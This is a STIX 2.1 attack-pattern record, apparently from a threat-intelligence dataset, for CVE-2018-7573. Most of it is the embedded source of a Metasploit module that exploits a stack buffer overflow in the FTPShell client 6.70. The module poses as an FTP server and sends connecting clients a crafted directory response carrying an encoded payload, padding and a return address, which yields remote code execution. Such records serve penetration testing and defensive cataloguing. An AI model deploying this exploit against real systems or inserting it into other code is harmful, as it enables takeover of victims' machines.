{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e52c905-ff8b-4adb-b52c-cb069934644c",
    "created": "2024-08-14T16:50:52.374548Z",
    "modified": "2024-08-14T16:50:52.374552Z",
    "name": "FTPShell client 6.70 (Enterprise edition) Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in the FTPShell client 6.70 (Enterprise edition) allowing remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ftpshell_cli_bof.rb",
            "external_id": "ftpshell_cli_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-7573"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FTPShell client 6.70 (Enterprise edition) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the FTPShell client 6.70 (Enterprise\n          edition) allowing remote code execution.\n        },\n      'Author'   =>\n        [\n          'r4wd3r',           # Original exploit author\n          'Daniel Teixeira'   # MSF module author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2018-7573'],\n          [ 'EDB', '44596' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x22\\x0d\\x0a\\x0b\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # CALL ESI in FTPShell.exe : 0x00452eed\n          [ 'Windows Universal', {'Ret' => \"\\xed\\x2e\\x45\" } ]\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'SRVHOST' => '0.0.0.0',\n          'EXITFUNC' => 'thread'\n        },\n      'DisclosureDate' => '2017-03-04',\n      'DefaultTarget'  => 0))\n\n    register_options [ OptPort.new('SRVPORT', [ true, 'The FTP port to listen on', 21 ]) ]\n  end\n\n  def exploit\n    srv_ip_for_client = datastore['SRVHOST']\n    if srv_ip_for_client == '0.0.0.0'\n      if datastore['LHOST']\n        srv_ip_for_client = datastore['LHOST']\n      else\n        srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')\n      end\n    end\n\n    srv_port = datastore['SRVPORT']\n\n    print_status(\"Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}\")\n    super\n  end\n\n  def on_client_connect(client)\n    p = regenerate_payload(client)\n    return if p.nil?\n    print_status(\"#{client.peerhost} - connected.\")\n\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\") unless res.empty?\n    print_status(\"#{client.peerhost} - Response: Sending 220 Welcome\")\n    welcome = \"220 Welcome.\\r\\n\"\n    client.put(welcome)\n\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\")\n    print_status(\"#{client.peerhost} - Response: sending 331 OK\")\n    user = \"331 OK.\\r\\n\"\n    client.put(user)\n\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\")\n    print_status(\"#{client.peerhost} - Response: Sending 230 OK\")\n    pass = \"230 OK.\\r\\n\"\n    client.put(pass)\n    res = client.get_once.to_s.strip\n    print_status(\"#{client.peerhost} - Request: #{res}\")\n\n    sploit = '220 \"'\n    sploit << payload.encoded\n    sploit << \"\\x20\" * (payload_space - payload.encoded.length)\n    sploit << target.ret\n    sploit << \"\\\" is current directory\\r\\n\"\n\n    print_status(\"#{client.peerhost} - Request: Sending the malicious response\")\n    client.put(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-04",
    "x_mitre_platforms": [
        "win'"
    ]
}